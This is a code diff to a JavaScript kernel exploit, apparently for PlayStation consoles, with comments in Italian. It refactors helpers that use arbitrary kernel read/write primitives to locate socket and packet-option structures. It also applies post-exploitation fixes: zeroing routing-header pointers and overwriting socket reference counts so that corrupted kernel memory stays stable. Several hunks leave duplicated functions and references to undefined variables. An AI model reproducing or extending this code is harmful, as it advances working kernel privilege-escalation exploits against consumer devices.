@@ -1176,24 +1176,37 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     const psd = pktopts_sds[0];
     const tclass = new Word();
     const off_tclass = is_ps4 ? 0xb0 : 0xc0;
+
+
+    
 const kernel = kernel_addr;
 
-/** Restituisce f_data (struct socket*) a partire dal FD */
-    
-function get_fd_data_addr(sock, read_fn) {
-  const fdesc = kernel.addr.curproc
-              + CURPROC_OFILES
-              + BigInt(sock) * BigInt(SIZEOF_OFILES);
-  const filep = read_fn(fdesc);
-  return read_fn(filep);
-}
+    const kmem = new KernelMemory(main_sd, worker_sd, pipes, kpipe);
 
-/** Restituisce inp_pktopts per un dato socket */
-function get_sock_pktopts(sock, read_fn) {
-  const sock_data = get_fd_data_addr(sock, read_fn);
-  const pcb       = read_fn(sock_data + BigInt(SO_PCB));
-  return read_fn(pcb + BigInt(INPCB_PKTOPTS));
-}
+  const { read64, write64, read32, write32 } = kmem;
+  const {
+    CURPROC_OFILES,
+    SIZEOF_OFILES,
+    SO_PCB,
+    INPCB_PKTOPTS
+  } = kernel_offset;
+    
+ 
+    
+ function get_fd_data_addr(sock, read_fn) {
+      const fdesc = kernel_addr.curproc
+                  + BigInt(CURPROC_OFILES)
+                  + BigInt(sock) * BigInt(SIZEOF_OFILES);
+      const filep = read_fn(fdesc);
+      return read_fn(filep);
+    }
+
+    function get_sock_pktopts(sock, read_fn) {
+      const sock_data = get_fd_data_addr(sock, read_fn);
+      const pcb       = read_fn(sock_data + BigInt(SO_PCB));
+      return read_fn(pcb + BigInt(INPCB_PKTOPTS));
+    }
+
 
     
 
@@ -1499,32 +1512,29 @@ function get_sock_pktopts(sock, read_fn) {
 
 
     
-// === FIX: reset rthdr for all sds ===
-for (let i = 0; i < sds.length; i++) {
-  const pkto = get_sock_pktopts(sds[i], kmem.read64.bind(kmem));
-  write64.call(kmem, pkto + off_ip6po_rthdr, 0n);
-}
+    for (let i = 0; i < sds.length; i++) {
+      const pkto = get_sock_pktopts(sds[i], read64);
+      write64(pkto + off_ip6po_rthdr, 0n);
+    }
+    // Azzera anche reclaim_sock e worker_pktopts
+    const re_pkto = get_sock_pktopts(reclaim_sock, read64);
+    write64(re_pkto + off_ip6po_rthdr, 0n);
+    write64(worker_pktopts + off_ip6po_rthdr, 0n);
 
-// AZZERA anche per reclaim_sock e worker
-const re_pkto = get_sock_pktopts(reclaim_sock, kmem.read64.bind(kmem));
-write64.call(kmem, re_pkto + off_ip6po_rthdr, 0n);
-write64.call(kmem, worker_pktopts + off_ip6po_rthdr, 0n);
+    // 6) FIX: bump so_count per prevenire free involontarie
+    const sock_increase_ref = [
+      ipv6_kernel_rw.data.master_sock,
+      ipv6_kernel_rw.data.victim_sock,
+      master_sock,
+      worker_sock,
+      reclaim_sock,
+    ];
+    for (const sd of sock_increase_ref) {
+      const sock_addr = get_fd_data_addr(sd, read64);
+      write32(sock_addr + 0x0, 0x100);
+    }
+    log("fixes applied");
 
-// === FIX: bump so_count per prevenire free accidentali ===
-const sock_increase_ref = [
-  ipv6_kernel_rw.data.master_sock,
-  ipv6_kernel_rw.data.victim_sock,
-  master_sock,
-  worker_sock,
-  reclaim_sock,
-];
-
-for (const sd of sock_increase_ref) {
-  const sock_addr = get_fd_data_addr(sd, kmem.read64.bind(kmem));
-  write32.call(kmem, sock_addr + 0x0, 0x100);
-}
-
-log("fixes applied");
     
     /*
     // REMOVE once restore kernel is ready for production
@@ -1811,14 +1821,7 @@ export async function kexploit() {
         const [kbase, kmem, p_ucred, restore_info] = make_kernel_arw(
             pktopts_sds, dirty_sd, reqs1_addr, kernel_addr, sds);
 
-        const { read64, write64, read32, write32 } = kmem;
-const {
-  CURPROC_OFILES,
-  SIZEOF_OFILES,
-  SO_PCB,
-  INPCB_PKTOPTS
-} = kernel_offset;
-
+  
 function get_fd_data_addr(sock, read_fn) {
   const fdesc = kernel.addr.curproc
               + CURPROC_OFILES
